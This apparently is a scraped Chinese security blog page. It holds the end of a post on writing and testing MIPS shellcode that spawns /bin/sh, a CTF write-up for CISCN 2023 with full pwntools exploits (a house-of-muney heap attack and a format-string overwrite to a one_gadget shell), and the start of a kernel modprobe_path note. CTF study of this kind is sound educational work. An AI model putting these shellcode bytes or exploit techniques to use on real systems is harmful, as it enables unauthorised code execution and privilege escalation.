<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305142032761.png" alt="image-20230514203232473"></p>
<h4 id="shellcode的提取与测试"><a href="#shellcode的提取与测试" class="headerlink" title="shellcode的提取与测试"></a>shellcode的提取与测试</h4><p>将 <code>shellcode</code> 提取的话，我用的方法是将其放到 <code>IDA</code> 里面，然后 <code>shift+e</code> 提取（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305142034440.png" alt="image-20230514203453331"></p>
<p>然后用下面的 <code>python</code> 脚本，<code>x</code> 列表里面放的是刚刚提前的数据，最后输出的内容便是 <code>shellcode</code> 字节码</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">x = [  <span class="number">0x24</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x11</span>, <span class="number">0x04</span>, <span class="number">0xD0</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x24</span>, <span class="number">0x06</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x27</span>, <span class="number">0xBD</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x27</span>, <span class="number">0xE4</span>, <span class="number">0x00</span>, <span class="number">0x14</span>,</span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x02</span>, <span class="number">0x0F</span>, <span class="number">0xAB</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x0C</span>]</span><br><span class="line"><span class="built_in">list</span>=[]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter the endian of the shell code&quot;</span>)</span><br><span class="line">choice=<span class="built_in">input</span>()</span><br><span class="line"><span class="keyword">if</span> choice==<span class="string">&quot;little&quot;</span>:</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(x),<span class="number">4</span>):</span><br><span class="line">    <span class="built_in">list</span>.extend(<span class="built_in">reversed</span>(x[i:i+<span class="number">4</span>]))</span><br><span class="line"><span class="keyword">if</span> choice==<span class="string">&quot;big&quot;</span>:</span><br><span class="line">  <span class="built_in">list</span> = x</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span>.join([<span class="string">f&#x27;\\x<span class="subst">&#123;<span class="built_in">hex</span>(num)[<span class="number">2</span>:].zfill(<span class="number">2</span>)&#125;</span>&#x27;</span> <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">list</span>])</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>最后就是测试提取出来的字节码能否正确执行，我们使用下面的 <code>C</code> 脚本（要<strong>注意编译完程序的字节序</strong>，如果程序是大端的，而 <code>shellcode</code> 是按照小端序写的，那么肯定是运行失败的）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//mips-linux-gnu-gcc shellcode.c -o test -static -g</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[] = &#123;</span><br><span class="line"><span class="string">&quot;\x24\x06\x01\x11\x04\xd0\xff\xff\x24\x06\x00\x00\x27\xbd\xff\xe0\x27\xe4\x00\x14\x24\x05\x00\x00\x24\x02\x0f\xab\x00\x00\x00\x0c/bin/sh&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> (*s)(<span class="type">void</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sc size %d\n&quot;</span>, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    s = shellcode;</span><br><span class="line">    s();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305142127071.png" alt="image-20230514212707011"></p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://b0ldfrev.gitbook.io/note/iot/mipsarm-hui-bian-xue-xi">mips_arm汇编学习 - Note (gitbook.io)</a></p>
<p><a target="_blank" rel="noopener" href="https://prowes5.github.io/2019/07/21/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">路由器漏洞分析环境搭建 | Prowes5’s Blog</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yalecaltech/article/details/117326975">(47条消息) MIPS下shellcode编写_Elwood Ying的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/cyberangel/rg9gdm/yxb067">《IoT从入门到入土》(1)–MIPS交叉编译环境搭建及其32位指令集 (yuque.com)</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/e4508dbd.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/e4508dbd.html" class="post-title-link" itemprop="url">Ciscn2023-华中赛区分区赛-pwn-wp</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-06-30 13:39:54" itemprop="dateCreated datePublished" datetime="2023-06-30T13:39:54+08:00">2023-06-30</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-07-01 11:47:23" itemprop="dateModified" datetime="2023-07-01T11:47:23+08:00">2023-07-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%B5%9B%E9%A2%98WP/" itemprop="url" rel="index"><span itemprop="name">赛题WP</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>今年国赛的华中分区赛一共放了两道 <code>PWN</code> ，一个一解，一个零解。零解的是 <code>LLVM PASS PWN</code> ，这个没有研究过，暂且先复现另一个题目（考察的是 <code>house of muney</code>）还有一个 <code>AWD</code> 环节的 <code>PWN</code> （考察的格式化字符串漏洞）</p>
<h3 id="muney"><a href="#muney" class="headerlink" title="muney"></a>muney</h3><p>本题没给 <code>libc</code> ，听说远程的 <code>libc</code> 版本为 <code>2.31 9.9</code> ，我这里用的是这个</p>
<h4 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306301539057.png" alt="image-20230630153903673"></p>
<h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><p>主函数首先是输入数据，并且将其传入了 <code>sub_4021f3</code> 函数进行处理，不断循环这个过程</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306301542350.png" alt="image-20230630154203298"></p>
<p><code>sub_4021f3</code> 函数是对各种功能的封装，不过在此之前经过了 <code>jiexi</code>（重命名后）函数对数据的解析处理，这里也是主要来逆向的地方。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306301543451.png" alt="image-20230630154341391" style="zoom:67%;" />



<p><code>jiexi</code> 函数的这个解析规则，可以通过 <code>GDB</code> 动态调试加上 <code>IDA</code> 静态分析来判断出这个函数就是在解析 <code>HTTP</code> 请求头，也就是输入的数据以 <code>HTTP</code> 请求头的格式输入即可。再简单调试一下，观察下哪部分是触发功能的选项以及参数即可，最终得出了规则大概如下（以触发 <code>create</code> 函数为例）</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content_length,content</span>):</span><br><span class="line">    payload=<span class="string">&quot;&quot;&quot;POST /create HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 10.12.145.134:50013</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Size: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(size)+<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Content-Length: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(content_length)+<span class="string">&quot;&quot;&quot;\n\r\n&quot;&quot;&quot;</span>+content</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>



<p><code>create</code> 函数可以申请堆块，而堆块最小为 <code>0x100000</code> ，这就意味着堆块会直接由 <code>mmap</code> 映射出来，位于内存映射区。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306301555216.png" alt="image-20230630155510162" style="zoom:50%;" />



<h4 id="漏洞所在"><a href="#漏洞所在" class="headerlink" title="漏洞所在"></a>漏洞所在</h4><p>在 <code>edit</code> 函数中，首先是获取了两个参数，第一个是索引，第二个则是偏移 <code>offset</code>，在下图的红框部分中可以发现针对偏移 <code>offset</code> 的检查并没有做好，只检查了偏移不能大于申请内存块时的 <code>size</code> ，但是却可以为负（<code>v9</code> 为 <code>int64</code> 类型），这就导致了可以在申请内存块的上方（低地址方向）去写入数据</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306301600658.png" alt="image-20230630160058576" style="zoom:50%;" />



<p>同时还存在一个 <code>exit</code> 函数，其参数为 <code>/bin/sh</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306301631953.png" alt="image-20230630163136902"></p>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>我在比赛时考虑的思路是想把 <code>exit</code> 函数的 <code>got</code> 表改为 <code>system</code> ，最后触发即可。但一直苦于没有 <code>libc</code> 地址。当时是向 <code>mmap</code> 映射出来的区域的低地址处写入数据（劫持了 <code>__free_hook</code> ），再用 <code>delete</code> 函数进行触发，也确实是可以任意地址执行，但没有泄露 <code>libc</code> 地址的机会，也就卡死在这里了。</p>
<p>比赛结束后，请教了一下华科的师傅，才知道有 <code>house of muney</code> 这种手法。</p>
<p>原理是这样的：在进行延迟绑定时，解析出符号的真实地址是用 <code>libc</code> 基地址加上符号表中 <code>st_value</code> 字段值获得的，如果能修改 <code>st_value</code> 这个值的话，将其改为 <code>system</code> 函数的 <code>st_value</code>，最终就可以让 <code>exit</code> 被解析成 <code>system</code>。困难在于每个符号的 <code>sym</code> 结构体所在内存区域是只读的，因此要改大内存块的 <code>size</code>，将其释放掉再申请出来，而 <code>malloc</code> 触发的 <code>mmap</code> 出的内存都是<strong>可读写</strong>的，只要足够大，就可以将符号的 <code>sym</code> 结构体给申请出来进行篡改。</p>
<p>不过为了绕过一些检查，最终能成功进行解析函数真实地址，还需要篡改一些字段。分别是 <code>bitmask_word</code> <code>bucket</code> <code>hasharr</code> <code>st_value</code> </p>
<p>至此，整体的流程如下</p>
<ol>
<li>申请一个 <code>0x150000</code> 的内存块</li>
<li>利用 <code>edit</code> 功能，修改内存 <code>size</code> 为 <code>0x171002</code> (不能太大，但是太小了又覆盖不到)</li>
<li>将其释放掉</li>
<li>申请一个 <code>0x171002</code> 的内存块，之后就可以来在这个范围内地址进行任意写入</li>
<li>伪造上面提到字段的值</li>
<li>最后触发 <code>exit(&quot;/bin/sh&quot;)</code> ，就能够解析成 <code>system(&quot;/bin/sh&quot;)</code></li>
</ol>
<p>需要伪造这几个字段的值写在了 <code>EXP</code> 中，<code>st_name</code> 的后四个字节是 <code>strtab</code> 距离符号名（<code>exit</code>）的偏移量 （不同程序需要调试得到），<strong>该字段前四个字节是固定的，<code>bitmask_word</code> 和 <code>bucket</code> 以及 <code>hasharr</code> 也都是固定的。</strong></p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;muney1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content_length,content</span>):</span><br><span class="line">    payload=<span class="string">&quot;&quot;&quot;POST /create HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 10.12.145.134:50013</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Size: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(size)+<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Content-Length: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(content_length)+<span class="string">&quot;&quot;&quot;\n\r\n&quot;&quot;&quot;</span>+content</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,offset,content_length,content</span>):</span><br><span class="line">    payload=<span class="string">b&quot;&quot;&quot;POST /edit HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 10.12.145.134:50013</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Idx: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(idx).encode()+<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Offset: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(offset).encode()+<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Content-Length: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(content_length).encode()+<span class="string">b&quot;&quot;&quot;\n\r\n&quot;&quot;&quot;</span>+content</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    payload=<span class="string">&quot;&quot;&quot;POST /delete HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 10.12.145.134:50013</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Idx: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(idx)+<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Content-Length: 16\n\r\n&quot;&quot;&quot;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">    payload=<span class="string">&quot;&quot;&quot;POST /quit HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 10.12.145.134:50013</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Idx: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(<span class="number">0</span>)+<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Content-Length: 16\n\r\n&quot;&quot;&quot;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,create(<span class="number">0x150000</span>,<span class="number">16</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="number">0</span>,-<span class="number">8</span>,<span class="number">3</span>,<span class="string">b&#x27;\x02\x10\x17&#x27;</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,delete(<span class="number">0</span>))</span><br><span class="line">debug(p,<span class="number">0x401FFF</span>,<span class="number">0x4021EE</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,create(<span class="number">0x171002</span>,<span class="number">16</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#exit@st_value distance mmap_base 0xf00012001a67e5    fake_data   0x1a67e5</span></span><br><span class="line"><span class="comment">#bitmask_word distance mmap_base 0x152b88  fake_data 0xf010028c0201130e</span></span><br><span class="line"><span class="comment">#bucket distance mmap_base 0x152cb0    fake_data 0x86</span></span><br><span class="line"><span class="comment">#hasharr distance mmap_base 0x153d7c   fake_data 0x7c967e3e7c967e3f</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="number">0</span>,<span class="number">0x152b78</span>,<span class="number">8</span>,p64(<span class="number">0xf010028c0201130e</span>)))<span class="comment">#write data to bitmask_word</span></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="number">0</span>,<span class="number">0x152ca0</span>,<span class="number">1</span>,p8(<span class="number">0x86</span>)))<span class="comment">#write data to bucket</span></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="number">0</span>,<span class="number">0x153d6c</span>,<span class="number">8</span>,p64(<span class="number">0x7c967e3e7c967e3f</span>)))<span class="comment">#write data to hasharr</span></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="number">0</span>,<span class="number">0x156d00</span>-<span class="number">0x8</span>,<span class="number">3</span>,<span class="string">b&quot;\x90\x22\x05&quot;</span>))<span class="comment">#write data to exit@st_value</span></span><br><span class="line"><span class="comment">#0x1a67e5</span></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="number">0</span>,<span class="number">0x156d00</span>-<span class="number">0x10</span>,<span class="number">3</span>,<span class="string">b&quot;\xe5\x67\x1a&quot;</span>))<span class="comment">#write data to exit@st_name</span></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="number">0</span>,<span class="number">0x156d00</span>-<span class="number">0x10</span>+<span class="number">4</span>,<span class="number">1</span>,<span class="string">b&quot;\x12&quot;</span>))<span class="comment">#write data to exit@st_name</span></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="number">0</span>,<span class="number">0x156d00</span>-<span class="number">0x10</span>+<span class="number">6</span>,<span class="number">1</span>,<span class="string">b&quot;\xf0&quot;</span>))<span class="comment">#write data to exit@st_name</span></span><br><span class="line"><span class="comment">#因为没办法写入 \x00 的原因，这里的st_name分了多次写入</span></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,quit())</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306301840455.png" alt="image-20230630184048404"></p>
<h3 id="awd-pwn"><a href="#awd-pwn" class="headerlink" title="awd_pwn"></a>awd_pwn</h3><p>程序实现了一个 <code>shell</code> ，漏洞位于 <code>echo</code> 中，如果 <code>echo</code> 后面有至少两个参数并且没有 <code>&gt;</code> 的情况下，除去最后一个参数，剩下参数打印时会触发格式化字符串漏洞（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306302215516.png" alt="image-20230630221533284"></p>
<p>利用思路是打栈链（考察的是非栈上的格式化字符串漏洞），劫持原本返回地址 <code>libc_start_main</code> 为 <code>one_gadget</code> ，最终输入一个非法命令，退出即可拿到 <code>shell</code></p>
<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"> </span><br><span class="line">p,e,libc=load(<span class="string">&quot;pwn&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">payload</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;$ \x1B[0m&quot;</span>,payload)</span><br><span class="line"> </span><br><span class="line">cmd(<span class="string">&quot;echo %29$p a&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\x78&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x240b3</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">one_gadget=libc_base+<span class="number">0xe3b31</span></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1Ed5</span>,<span class="number">0x2818</span>,<span class="number">0x23C5</span>)</span><br><span class="line">cmd(<span class="string">&quot;echo %12$p a&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\x78&quot;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"> </span><br><span class="line">libc_start_main_address=stack_addr+<span class="number">0x38</span></span><br><span class="line"> </span><br><span class="line">log_addr(<span class="string">&#x27;stack_addr&#x27;</span>)</span><br><span class="line"><span class="comment">#write 0xe8 to address of libc_start_main </span></span><br><span class="line">cmd(<span class="string">&quot;echo %&quot;</span>+<span class="built_in">str</span>(libc_start_main_address&amp;<span class="number">0xffff</span>)+<span class="string">&quot;c%31$hn a&quot;</span>)</span><br><span class="line"><span class="comment">#one_gadget 0xe3b31</span></span><br><span class="line">cmd(<span class="string">&quot;echo %&quot;</span>+<span class="built_in">str</span>(one_gadget&amp;<span class="number">0xffff</span>)+<span class="string">&quot;c%59$hn a&quot;</span>)</span><br><span class="line">cmd(<span class="string">&quot;echo %&quot;</span>+<span class="built_in">str</span>((libc_start_main_address+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&quot;c%31$hn a&quot;</span>)</span><br><span class="line">cmd(<span class="string">&quot;echo %&quot;</span>+<span class="built_in">str</span>((one_gadget&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&quot;c%59$hn a&quot;</span>)</span><br><span class="line">cmd(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306302229508.png" alt="image-20230630222938439"></p>
<h3 id="题目附件"><a href="#题目附件" class="headerlink" title="题目附件"></a>题目附件</h3><p><strong>muney</strong></p>
<p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/18eXF0Y_cE4ooQG50TB_7ig?pwd=flc5">https://pan.baidu.com/s/18eXF0Y_cE4ooQG50TB_7ig?pwd=flc5</a><br>提取码：flc5</p>
<p><strong>awd_pwn</strong></p>
<p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1F9qv7kqVB5yFbAULPtl_0Q?pwd=1234">https://pan.baidu.com/s/1F9qv7kqVB5yFbAULPtl_0Q?pwd=1234</a> </p>
<p>提取码：1234</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://roderickchan.github.io/zh-cn/2022-06-18-glibcheap-house-of-muney/#poc">GlibcHeap-house of muney - roderick - record and learn! (roderickchan.github.io)</a></p>
<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272416.htm#msg_header_h3_56">原创]how2heap深入浅出学习堆利用-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/12effc43.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/12effc43.html" class="post-title-link" itemprop="url">关于 kernel-RW Any Memory 的学习总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:59:56" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>通过本题的学习，了解到了在内核的内存具有任意地址读写的能力后，可以利用的手法。</p>
<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p><code>modprobe</code> 是一个 <code>Linux</code> 程序，用于在 <code>Linux</code> 内核中添加或移除一个可加载内核模块，该程序的路径是内核全局变量，默认为 <code>/sbin/modprobe</code>，存在在内核符号 <code>modprobe_path</code> 下（此处内存有可写权限）。</p>
<p>当执行的文件类型为系统未知的类型时（也就是未知的文件魔术头），将通过 <code>modprobe_path</code> 来执行 <code>modprobe</code> 程序。需要注意的是，<code>modprobe_path</code> 中存储的路径并不会被判断是否正常，无论路径指向的是哪个文件，都会将其执行，因为系统仍然处于内核模式，所以是以 <code>root</code> 权限执行的目标文件，如果目标文件是我们编写的 <code>shell</code> 脚本，那么就相当于我们具有了 <code>root</code> 权限下的任意执行命令的能力。</p>
<p>因此如果有任意地址读写的能力，可以考虑覆盖 <code>modprobe_path</code> ，它比起调用<code>commit_creds(prepare_kernel_cred(0))</code> 更方便。</p>
<p>题目是 2019STARCTF hackeme 链接：<a target="_blank" rel="noopener" href="https://github.com/cc-sir/ctf-challenge/tree/master/2019%20STARCTF%20hackme">https://github.com/cc-sir/ctf-challenge/tree/master/2019%20STARCTF%20hackme</a></p>
<h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>通过下面的 <code>_kmalloc</code> 函数，可以分析出来 <code>v19</code> 是 <code>size</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102012069.png" alt="image-20230410201237881"></p>
<p>而程序最开始有一个 <code>copy_from_user</code> 函数， <code>copy</code> 了 <code>32</code> 个字节的数据，正好是可以控制从 <code>v17</code> 开始到 <code>v20</code> ，考虑到上面 <code>v19</code> 是个 <code>size</code> ，我们可以猜测这四个变量都是一个结构体中的成员变量</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102014305.png" alt="image-20230410201412269"></p>
<p>通过这三行代码，可以猜测出来 <code>v17</code> 是一个 <code>index</code> ，其决定了申请出来堆块的地址放到 <code>pool</code> 数组的哪个位置（ <code>pool</code> 数组就是来存放申请的堆块地址的）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102033502.png" alt="image-20230410203337467"></p>
<p>这里将 <code>v18</code> 中的数据 <code>copy</code> 到了刚刚申请的堆块中，所以我们判断 <code>v18</code> 是 <code>data_ptr</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102117851.png" alt="image-20230410211733810"></p>
<p>程序中的 <code>v20</code> ，刚开始看感觉很奇怪，具体啥作用也说不上来，因为 <code>v4</code> 已经是堆地址了，所以加上的 <code>v20</code> 我们姑且称之为 <code>offset</code></p>
